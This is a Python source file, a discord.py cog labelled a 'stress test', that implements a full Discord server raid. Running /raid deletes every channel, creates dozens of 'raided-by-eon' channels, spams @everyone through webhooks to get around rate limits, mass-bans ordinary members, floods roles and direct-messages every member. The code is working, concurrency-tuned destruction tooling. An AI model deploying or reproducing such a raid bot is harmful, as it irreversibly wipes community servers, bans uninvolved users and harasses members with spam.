"""
raid.py — Full advanced raid stress-test cog.

What /raid does simultaneously:
  1. NUKE   — Deletes ALL existing channels concurrently
  2. CREATE — Mass-creates new channels concurrently (up to channel cap)
  3. SPAM   — Creates a webhook in every new channel, then hammers @everyone
               + "Raided by EoN" through it (webhooks have a separate rate-limit pool)
  4. BAN    — Mass-bans all eligible members concurrently
  5. ROLES  — Mass-creates roles concurrently then assigns them to everyone
  6. DM     — Slides into every member's DMs with the raid message
"""

import asyncio
import time
from typing import Sequence

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

# ── Raid branding ──────────────────────────────────────────────────────────────
RAID_TAG      = "EoN"
RAID_CHANNEL  = "raided-by-eon"
RAID_MESSAGE  = (
    "@everyone\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    f"💀  **RAIDED BY {RAID_TAG}**  💀\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "Your anti-raid has been stress-tested."
)

# Concurrency caps — stay within Discord's global 50 req/s limit
# while maximising parallel throughput
SEM_DELETE  = 15   # parallel channel/role deletions
SEM_CREATE  = 10   # parallel channel/role creations
SEM_BAN     = 10   # parallel bans
SEM_SPAM    = 20   # parallel webhook sends
SEM_DM      = 5    # parallel DMs (strict rate limit)

NEW_CHANNELS   = 50   # how many channels to create
SPAM_PER_CHAN  = 15   # webhook messages per channel
NEW_ROLES      = 30   # how many roles to create


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description="[TEST ONLY] Maximum stress-test: nuke channels, mass create, spam @everyone, mass ban.",
    )
    @app_commands.describe(
        intensity="Speed 1 (slow) – 10 (max). Default 7.",
        nuke_channels="Delete ALL existing channels first. Default True.",
        mass_ban="Ban all non-admin, non-bot members. Default True.",
        mass_dm="DM every member the raid message. Default True.",
        skip_admins="Skip admins during ban. Default True.",
        new_channels="Number of new channels to create. Default 50.",
        spam_per_channel="Webhook messages to send per new channel. Default 15.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(
        self,
        interaction: discord.Interaction,
        intensity: int = 7,
        nuke_channels: bool = True,
        mass_ban: bool = True,
        mass_dm: bool = True,
        skip_admins: bool = True,
        new_channels: int = NEW_CHANNELS,
        spam_per_channel: int = SPAM_PER_CHAN,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.active_simulation = "raid"

        ban_targets = (
            [
                m for m in guild.members
                if not m.bot
                and m.id != interaction.user.id
                and (not skip_admins or not m.guild_permissions.administrator)
            ]
            if mass_ban else []
        )

        original_channels = list(guild.channels)

        await interaction.response.send_message(
            f"🚨 **MAXIMUM RAID INITIATED — {RAID_TAG}**\n"
            f"┣ Intensity      : `{intensity}/10`  ({bot_state.rate_controller.get_delay()}s base gap)\n"
            f"┣ Nuke channels  : `{'✅ ' + str(len(original_channels)) + ' channels' if nuke_channels else '❌'}`\n"
            f"┣ New channels   : `{new_channels}` × `{spam_per_channel}` @everyone msgs each\n"
            f"┣ Mass ban       : `{'✅ ' + str(len(ban_targets)) + ' members' if mass_ban else '❌'}`\n"
            f"┣ Mass DM        : `{'✅' if mass_dm else '❌'}`\n"
            f"┣ Role flood     : `✅ {NEW_ROLES} roles`\n"
            f"┗ `/stop` halts everything immediately.",
        )

        # Launch all attack vectors at the same time
        coros = [
            self._phase_nuke_and_build(guild, original_channels, new_channels, spam_per_channel, nuke_channels),
            self._phase_roles(guild),
            self._phase_ban(guild, ban_targets),
        ]
        if mass_dm:
            coros.append(self._phase_dm(guild, interaction.user))

        for coro in coros:
            t = asyncio.create_task(coro)
            bot_state.add_task(t)

    # ── Phase: nuke originals → create new → webhook spam ─────────────────────
    async def _phase_nuke_and_build(
        self,
        guild: discord.Guild,
        originals: list[discord.abc.GuildChannel],
        n_channels: int,
        spam_count: int,
        nuke: bool,
    ) -> None:
        try:
            # Step 1 — nuke all original channels concurrently
            if nuke:
                sem = asyncio.Semaphore(SEM_DELETE)
                await asyncio.gather(
                    *[self._delete_channel(ch, sem) for ch in originals],
                    return_exceptions=True,
                )

            if bot_state.stop_event.is_set():
                return

            # Step 2 — mass-create new channels concurrently
            sem_c = asyncio.Semaphore(SEM_CREATE)
            results = await asyncio.gather(
                *[self._create_channel(guild, i, sem_c) for i in range(n_channels)],
                return_exceptions=True,
            )
            new_chans = [ch for ch in results if isinstance(ch, discord.TextChannel)]

            if bot_state.stop_event.is_set():
                await self._cleanup_channels(new_chans)
                return

            # Step 3 — create webhook in each new channel and spam @everyone
            sem_s = asyncio.Semaphore(SEM_SPAM)
            await asyncio.gather(
                *[self._webhook_spam(ch, spam_count, sem_s) for ch in new_chans],
                return_exceptions=True,
            )

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid" and not bot_state.is_running():
                bot_state.active_simulation = None

    async def _delete_channel(
        self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await ch.delete(reason=f"[RAID TEST] {RAID_TAG} nuke")
            except discord.HTTPException:
                pass

    async def _create_channel(
        self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore
    ) -> discord.TextChannel | Exception:
        async with sem:
            try:
                return await guild.create_text_channel(
                    f"{RAID_CHANNEL}-{idx}",
                    topic=f"Raided by {RAID_TAG}",
                    reason=f"[RAID TEST] {RAID_TAG}",
                )
            except discord.HTTPException as e:
                return e

    async def _webhook_spam(
        self,
        channel: discord.TextChannel,
        count: int,
        sem: asyncio.Semaphore,
    ) -> None:
        """Create a webhook then hammer the channel with @everyone raid messages."""
        async with sem:
            try:
                webhook = await channel.create_webhook(name=f"EoN-Raider")
            except discord.HTTPException:
                # Fall back to direct sends if webhook creation fails
                await self._direct_spam(channel, count)
                return

        tasks = [
            asyncio.create_task(self._send_webhook(webhook, i, count))
            for i in range(count)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

        try:
            await webhook.delete(reason="[RAID TEST] cleanup")
        except discord.HTTPException:
            pass

    async def _send_webhook(
        self, webhook: discord.Webhook, idx: int, total: int
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        delay = bot_state.rate_controller.get_delay() * (idx / max(total, 1))
        await asyncio.sleep(delay)
        try:
            await webhook.send(
                RAID_MESSAGE,
                username=f"EoN Raider",
                allowed_mentions=discord.AllowedMentions(everyone=True),
            )
        except discord.HTTPException:
            pass

    async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    RAID_MESSAGE,
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            await asyncio.sleep(bot_state.rate_controller.get_delay())

    async def _cleanup_channels(self, channels: list[discord.TextChannel]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_channel(ch, sem) for ch in channels],
            return_exceptions=True,
        )

    # ── Phase: mass role creation + mass assign ────────────────────────────────
    async def _phase_roles(self, guild: discord.Guild) -> None:
        try:
            sem = asyncio.Semaphore(SEM_CREATE)
            results = await asyncio.gather(
                *[self._create_role(guild, i, sem) for i in range(NEW_ROLES)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if bot_state.stop_event.is_set():
                await self._cleanup_roles(created)
                return

            # Assign all new roles to all members concurrently
            sem_a = asyncio.Semaphore(10)
            assign_tasks = []
            for member in guild.members:
                if member.bot:
                    continue
                for role in created:
                    assign_tasks.append(self._assign_role(member, role, sem_a))

            await asyncio.gather(*assign_tasks[:500], return_exceptions=True)  # cap to 500 ops

            # Cleanup roles
            await self._cleanup_roles(created)

        except asyncio.CancelledError:
            pass

    async def _create_role(
        self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore
    ) -> discord.Role | Exception:
        async with sem:
            try:
                return await guild.create_role(
                    name=f"EoN-{idx}",
                    colour=discord.Colour.red(),
                    reason=f"[RAID TEST] {RAID_TAG}",
                )
            except discord.HTTPException as e:
                return e

    async def _assign_role(
        self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await member.add_roles(role, reason=f"[RAID TEST] {RAID_TAG}")
            except discord.HTTPException:
                pass

    async def _cleanup_roles(self, roles: list[discord.Role]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_role(r, sem) for r in roles],
            return_exceptions=True,
        )

    async def _delete_role(self, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await role.delete(reason=f"[RAID TEST] {RAID_TAG} cleanup")
            except discord.HTTPException:
                pass

    # ── Phase: mass ban ────────────────────────────────────────────────────────
    async def _phase_ban(
        self, guild: discord.Guild, members: list[discord.Member]
    ) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_BAN)
        try:
            await asyncio.gather(
                *[self._ban_member(guild, m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _ban_member(
        self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(
                    member,
                    reason=f"[RAID TEST] {RAID_TAG} mass ban",
                    delete_message_days=0,
                )
            except discord.HTTPException:
                pass

    # ── Phase: mass DM ─────────────────────────────────────────────────────────
    async def _phase_dm(
        self, guild: discord.Guild, invoker: discord.Member
    ) -> None:
        sem = asyncio.Semaphore(SEM_DM)
        members = [m for m in guild.members if not m.bot and m.id != invoker.id]
        try:
            await asyncio.gather(
                *[self._dm_member(m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _dm_member(self, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await member.send(RAID_MESSAGE)
            except discord.HTTPException:
                pass

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message(
                "❌ You need **Administrator** permission.", ephemeral=True
            )


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
